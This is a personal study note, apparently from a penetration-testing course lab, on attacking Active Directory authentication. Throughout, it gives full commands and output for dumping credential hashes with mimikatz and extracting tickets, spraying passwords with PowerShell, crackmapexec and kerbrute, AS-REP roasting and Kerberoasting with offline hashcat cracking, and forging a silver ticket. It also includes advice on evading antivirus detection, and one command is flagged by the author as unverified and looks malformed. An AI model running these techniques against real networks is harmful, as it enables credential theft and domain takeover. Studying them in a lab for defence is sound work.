
# AD Auth
See [AD Authentication](Active%20Directory.md#Authentication) for in-depth explanation of NTLM and Kerberos auth processes.


#### Scenario
- We've got elevated local admin privs on CLIENT75 as `jeff`

**192.168.x.70** - DC1
**192.168.x.72** - web04
**192.168.x.75** - client75

##### Hash dump
- Elevate privs
```powershell
whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 


Start-Process powershell.exe -Verb runas


whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

- Start mimikatz
> Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz.

```powershell
cd C:\Tools

.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

- Dump creds of all logged-in users
```powershell
# mimikatz #
privilege::debug
	Privilege '20' OK

sekurlsa::logonpasswords
	Authentication Id : 0 ; 7578418 (00000000:0073a332)
	Session           : Batch from 0
	User Name         : dave
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:51:28 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1103
	        msv :
	         [00000003] Primary
	         * Username : dave
	         * Domain   : CORP
	         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494             #<-- NOTE
	         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd     #<-- NOTE
	         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
	...
	Authentication Id : 0 ; 6858012 (00000000:0068a51c)
Session           : RemoteInteractive from 2                           #<-- NOTE
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 8/3/2024 11:43:06 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea                 #<-- NOTE
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f         #<-- NOTE
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
	...
```
	- Should dump all hashes for all logged in users including those RDP'd in (see `jeff`)

Hashes shown will vary based on AD implementation
- Only NTLM is available for AD instances at a functional level of Windows 2003
- NTLM and SHA-1 may be available for instances running Windows Server 2008 or later
- WDigest is enabled for older operating systems like Windows 7, or operating systems that have it manually set
	- When enabled, mimikatz will display cleartext alongside the hash


##### Abusing TGT & Service Tickets
- Create and cache a service ticket by listing the contents of the SMB share on web04
```powershell
dir \\web04.corp.com\backup
	    Directory: \\web04.corp.com\backup
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

- Use mimikatz to view the ticket stored in memory
```powershell
# mimikatz #
sekurlsa::tickets
	Authentication Id : 0 ; 6857791 (00000000:0068a43f)
	Session           : RemoteInteractive from 2
	User Name         : jeff
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:43:06 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1105
	
	         * Username : jeff
	         * Domain   : CORP.COM
	         * Password : (null)
	
	        Group 0 - Ticket Granting Service                                                                            #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 12:07:44 PM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM
	           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             322c28d6c359900cb7005cdb41aedbfa1859bbae6edfaf59a56fe567b910ac3d
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
	         [00000001]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
	           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             fe1e7b604e288fb57e84dbea8ca6d03408f8119c5409a7e48edc56f4bf8167a5
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
	
	        Group 1 - Client Ticket ?
	
	        Group 2 - Ticket Granting Ticket                                                                             #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
	           Target Name  (02) : krbtgt ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( corp.com )
	           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             5a7372545540bf0f0087ff02181492f0635cef46e6f2b78c61488918a95991a0
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```
	- Output shows both TGS & TGT
		- TGS allows access to only particular resources associated with those tickets
		- TGT allows us to request a TGS for specific resources we want to target within the domain



# AD PW Attacks

Before attempting brute forcing or wordlist auth attacks, it's important to consider account lockout.
Too many attempts might yield a lockout or alert sysadmins of presence
- Always best to get hash and crack offline


- View account lockout policy
```powershell
net accounts
	Force user logoff how long after time expires?:       Never
	Minimum password age (days):                          1
	Maximum password age (days):                          42
	Minimum password length:                              7
	Length of password history maintained:                24
	Lockout threshold:                                    5
	Lockout duration (minutes):                           30
	Lockout observation window (minutes):                 30
	Computer role:                                        WORKSTATION
	The command completed successfully.
```
	- Lockout Threshold - Indicates 5 attempts before being locked out
		- Can safely attempt 4 before risking a lock out.
	- Lockout Observation Window - Indicates how long the lockout lasts.

With the above info, assuming a user doesn't fail a login, we can safely attempt 192 logins in a 24-hour period against every domain user without triggering a lockout

Most simple, but noisiest, password attack would be to compile a short list of most common passwords and spraying it against a massive amount of users.  But there are better ways:


## LDAP & ADSI Spray

Type of pw spraying attack which leverages the *DirectoryEntry* utilized in the [AD Enumeration LDAP](21%20-%20AD Enumeration.md#LDAP) section by making queries in the context of a different user.

While previously we performed queries against the domain controller as a logged-in user with DirectoryEntry, here we'll make queries in the context of a different user by setting the DirectoryEntry instance.

- Provide three arguments, including the LDAP path to the domain controller, the username, and the password to the *DirectoryEntry* constructor
```powershell
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = ($domainObj.PdcRoleOwner).Name

# Construct LDAP path to search 
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# Attempt
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

- If the uname and pw are correct, the object will be created show the following results:
```powershell
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

- If the uname and pw are incorrect, the object will not be created and an exception will be shown:
```powershell
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

### Spray-Passwords.ps1
PS Script which uses the above ^ abilities to enumerate all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_

```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
	WARNING: also targeting admin accounts.
	Performing brute force - press [q] to stop the process and print results...
	Guessed password for user: 'pete' = 'Nexus123!'
	Guessed password for user: 'jen' = 'Nexus123!'
	Users guessed are:
	 'pete' with password: 'Nexus123!'
	 'jen' with password: 'Nexus123!'
```
	- -Pass - Attempt with a single password
	- -Admin - Also test admin accounts.


## SMB AD Spray
- One of the traditional approaches to pw spraying in AD envs.
- Some drawbacks
	- For every attempt, a full SMB conn has to be set up and terminated.
		- Very noisy
	- Quite slow

### crackmapexec
- Has multiple protocols with which to attack from
- Will show if user has admin privs on the target
- Doesn't examine the password policy of the domain before spraying
	- Be careful about account lockout


- Using a user list of `dave`, `jen`, `pete`, attempt to find valid creds
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123!


crackmapexec smb 192.168.217.75 -u dave -p 'Flowers1' -d corp.com
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)



crackmapexec smb 192.168.217.70-76 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
	SMB         192.168.217.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
	SMB         192.168.217.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
	SMB         192.168.217.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)
	SMB         192.168.217.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.73  445    FILES04          [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.70  445    DC1              [+] corp.com\pete:Nexus123! 
	SMB         192.168.217.72  445    WEB04            [+] corp.com\pete:Nexus123!
```
	- --continue-on-success - Avoid stopping at the first valid cred
	- `+` or `-` Indicates validity of creds
	- (Pwn3d!) - Indicates they have admin privs on the target


## TGT

### kinit
- Use on Linux
- Can obtain & cache a Kerberos TGT
- Need to provide a uname & pw
	- If creds are valid, will obtain TGT
- Advantage:
	- Only uses 2 UDP frames to determine validity
		- Sends only AS-REQ & examines response.
- Can use Bash to automate


### kerbrute
- Cross platform

- Using same unames in a .txt file as earlier (ANSI encoded), spray the domain
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"
	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
	
	Version: v1.0.3 (9dad6e1) - 08/10/24 - Ronnie Flathers @ropnop
	
	2024/08/10 19:10:52 >  Using KDC(s):
	2024/08/10 19:10:52 >   dc1.corp.com:88
	2024/08/10 19:10:52 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
	2024/08/10 19:10:52 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
	2024/08/10 19:10:52 >  Done! Tested 3 logins (2 successes) in 0.051 seconds
```


# AS-REP Roasting

As mentioned, when requesting auth:

AS-REQ is sent and an AS-REP containing the session key and TGT is sent back by the DC if the creds are valid.
- aka `Kerberos preauthorization`
- Prevents offline password guessing
- w/o, attacker could send an AS-REQ to DC on behalf of any user.

After obtaining the AS-REP from the DC, however, an attacker could perform an offline attack against the encrypted part of the response.
- aka `AS-REP Roasting`

> AD user account option is set to _Do not require Kerberos preauthentication_ - disabled by default
	- Kerberos preauth is performed for all users
	- Possible to enable this account option manually
	- May be enabled as some apps and techs require it to function normally


## impacket-GetNPUsers
- Linux


```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	Password:
Nexus123!

	Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
	----  ----------------------------------------  --------------------------  --------------------------  --------
	dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-08-15 18:50:28.120337  0x410200 
	$krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad85d4e993e$63d4f20107561af445642f5bc83291f78351dbe5e61d94f2c991fe03c6d81f71c8e6f2ace3fed38aacf5f020c6d8648196a24ef8b3ac828b8e0dff37873772ab5d64d0dae4a7d51a494c7c6332dceb44d614aac6fe3eed63678b423d3c13dcb36ba58d5a8c64c809e67d7222590bf5fcd131bd874068c42e66215ad4c166c4b251320da478c9c9f0b37520f770aca67e05425244095d03d4e47af00cf21e0b6d062e480bf967423b139f9d3c80ba5592fa599b243e5e73c26c8f5242e5e71b2523590de738243893fa55b11599bf393d94499341220e0ca45c8375f3617e9607c065b416
```
	- -dc-ip - IP address of the domain controller
	- -request - Request a TGT
	- -outputfile - Name of the file the AS-REP hash will be stored (hashcat format)
	- corp.com/pete - Auth target in **domain/user** format
		- This is the user we use for authenticating

> Had to run the above command twice to get it to work.  Careful w/ copy/pasting!

Above shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting

- Check correct mode for hashcat
```bash
hashcat --help | grep -i "Kerberos"
	  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
	  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
	  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
	  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
	  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
	  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
	   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
	  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
	  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol     #<-- This one
```

- Offline crack AS-REP hash
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	...
	$krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad85d4e993e$63d4f20107561af445642f5bc83291f78351dbe5e61d94f2c991fe03c6d81f71c8e6f2ace3fed38aacf5f020c6d8648196a24ef8b3ac828b8e0dff37873772ab5d64d0dae4a7d51a494c7c6332dceb44d614aac6fe3eed63678b423d3c13dcb36ba58d5a8c64c809e67d7222590bf5fcd131bd874068c42e66215ad4c166c4b251320da478c9c9f0b37520f770aca67e05425244095d03d4e47af00cf21e0b6d062e480bf967423b139f9d3c80ba5592fa599b243e5e73c26c8f5242e5e71b2523590de738243893fa55b11599bf393d94499341220e0ca45c8375f3617e9607c065b416:Flowers1
    
	Session..........: hashcat
	Status...........: Cracked
	Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
	Hash.Target......: $krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad...65b416
	Time.Started.....: Thu Aug 15 19:44:07 2024, (0 secs)
	Time.Estimated...: Thu Aug 15 19:44:07 2024, (0 secs)
```

>To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use _impacket-GetNPUsers_ as shown without the **-request** and **-outputfile** options.


## Rubeus
- Windows
- Toolset for raw Kerberos interactions and abuses.


- Automatically id vuln user accounts
```powershell
.\Rubeus.exe asreproast /nowrap
	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/
	
	  v2.1.2
	
	[*] Action: AS-REP roasting
	
	[*] Target Domain          : corp.com
	
	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
	[*] SamAccountName         : dave
	[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
	[*] Using domain controller: DC1.corp.com (192.168.170.70)
	[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
	[+] AS-REQ w/o preauth successful!
	[*] AS-REP hash:
	      $krb5asrep$dave@corp.com:4A9CE5DAC38B8BE40207F0D48449529F$3253BE584C6E6A0F6E068F5E7A0F9E57F633B56003F1855E3AF7D68820BEE605FD898864EF6FB9546CBB9DB16BD620A08BB883A28F7094EE6DA1815118D718EE02D578A6D9DF788D2955B0FDE576F3C92FE03B3804E1631DE4B960A2B12FBAE6845AF67A870F930410D04488A7356E6F1ED31AE4404B8AC42AF50F209581A623C9B4B67F51E75C8968BCFDAFC848C93FA35945EB1AC9DE876BE8B2C64CFCE36D7BA1B52E8B8E3DB281694A31F381BDE7E4600334EB962E9EC59A949BD66A2CB7C362042E19F8946239D4506D7768E98AF83CF17D9ED0E8486F6612E9D2D587372D2F69B1
```
	- When used while logged in as a pre-authed domain user, we don't need to add in any options other than `asreproast`
	- /nowrap - Prevent new lines being added to the AS-REP hash results


Again, shows that *dave* is the vuln user.
As w/ Linux, offline crack w/ hashcat
```bash
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


>To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired**
```powershell
Get-User -PreautNotRequired


# LDAP query
(&(&(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))
```


### _Targeted AS-REP Roasting_

Assuming we do not find any users w/ the *Do not require...* account option enabled, if we have control of an account w/ _GenericWrite_ or _GenericAll_ perms,
	we can leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication

```powershell
Get-ADUSer -Filter 'DoesNotRequirePreAuth - eq $false' | Set-ADAccountControl -doesnotrequirepreauth $true
```

> Should always reset UAC value once hash is obtained.


>>>>>>>>>>>>>> Double check & verify ^^^^^^^^



# Kerberoasting

**Kerberos Protocol**
- When a user wants to access a resource hosted by a Service Principal Name (SPN)
	- Client requests a service ticket that is generated by the domain controller.
	- Service ticket is then decrypted and validated by the application server.


>When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
>These checks are performed as a second step only when connecting to the service itself.
>This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.


The service ticket is encrypted via the password hash of the SPN
- If we can request the ticket and decrypt it w/ brute force/ guessing, we can use it to crack the cleartext pw of the service account


- Specify `kerberoast` command with [**Rubeus**](Tools.md#Rubeus)
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/
	
	  v2.1.2
	
	
	[*] Action: Kerberoasting
	
	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
	
	[*] Target Domain          : corp.com
	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
	
	[*] Total kerberoastable users : 1
	
	
	[*] SamAccountName         : iis_service
	[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
	[*] ServicePrincipalName   : HTTP/web04.corp.com:80
	[*] PwdLastSet             : 9/7/2022 5:38:43 AM
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Tools\hashes.kerberoast
```
	- /outfile - File to store TGS-Rep results
	- Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user

ID'd one user account vulnerable to Kerberoasting and wrote the hash to an output file.

- Search for correct hashcat mode.
```bash
hashcat --help | grep -i "Kerberos"
	  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
	  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
	  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
	  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
	  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
	  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
	   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
	  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol     #<-- This one
	  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

- Crack
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	...
	d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
	...
```


# Silver Tickets

During Kerberos auth:
- The application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket.
- **BUT**, the user and group permissions in the service ticket **aren't** verified by the application in a majority of environments.
- The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

Once we obtain the service account password (or its associated NTLM hash), we can forge our own service ticket with whatever perms we want.
If the SPN is used on multiple servers, we can leverage this ticket against all of them.

> Privileged Account Certificate (PAC) validation
> - Optional validation process the SPN app and the DC.
> - If enabled, the authenticating user and the service's privs are validated.
> 	- "Rarely" enabled, but prevents Silver Ticket attacks


##### Scenario:
- As discovered previously, the _iis_service_ user account is mapped to an HTTP SPN.
- The password hash of the user account is used to create service tickets for it.
- Assume we've identified that the _iis_service_ user has an established session on CLIENT75.

- Check current user's access to the resource of the HTTP SPN mapped to _iis_service_
```powershell
iwr -UseDefaultCredentials http://web04
	iwr : Server Error
	401 - Unauthorized: Access is denied due to invalid credentials.
	...
```

- Verify local admin access
```powershell
net localgroup administrators    OR
get-localgroupmember administrators
	ObjectClass Name                   PrincipalSource
	----------- ----                   ---------------
	User        CLIENT75\Administrator Local
	User        CLIENT75\offsec        Local
	User        CORP\dave              ActiveDirectory
	Group       CORP\Domain Admins     ActiveDirectory
	User        CORP\jeff              ActiveDirectory
```

- Verify established sessions
```powershell

```

- Start powershell as admin
```powershell
Start-Process powershell.exe -Verb runas
```

- Get the SPN NTLM hash
```powershell
cd C:\Tools
.\mimikatz.exe

mimikatz # privilege::debug
	Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
	...
	Authentication Id : 0 ; 1196098 (00000000:00124042)
	Session           : Service from 0
	User Name         : iis_service
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/16/2024 1:12:06 PM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1109
	        msv :
	         [00000003] Primary
	         * Username : iis_service
	         * Domain   : CORP
	         * NTLM     : 4d28cf5252d39971419580a51484ca09
	         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
	         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
	        ...
```

- Get domain SID
```powershell
whoami /user
	USER INFORMATION
	----------------
	User Name SID
	========= =============================================
	corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105       #<-- NOTE:  didn't work w/ the last `-1105`.  Worked once removed.
```

- Create ticket w/ Mimikatz
```powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
	User      : jeffadmin
	Domain    : corp.com (CORP)
	SID       : S-1-5-21-1987370270-658905905-1781884369-1105
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
	Service   : http
	Target    : web04.corp.com
	Lifetime  : 8/16/2024 1:44:56 PM ; 8/14/2034 1:44:56 PM ; 8/14/2034 1:44:56 PM
	-> Ticket : ** Pass The Ticket **
	
	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated
	
	Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

- Verify list of cached Kerberos tickets
```powershell
klist
	Current LogonId is 0:0x2fe07f
	Cached Tickets: (1)
	
	#0>     Client: jeffadmin @ corp.com
	        Server: http/web04.corp.com @ corp.com
	        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
	        Start Time: 8/16/2024 13:44:56 (local)
	        End Time:   8/14/2034 13:44:56 (local)
	        Renew Time: 8/14/2034 13:44:56 (local)
	        Session Key Type: RSADSI RC4-HMAC(NT)
	        Cache Flags: 0
	        Kdc Called:
```

- Test access again
```powershell
iwr -UseDefaultCredentials http://web04
	StatusCode        : 200
	StatusDescription : OK
	Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
	                    <html xmlns="http://www.w3.org/1999/xhtml">
	                    <head>
	                    <meta http-equiv="Content-Type" cont...
	RawContent        : HTTP/1.1 200 OK
```


# DC Sync

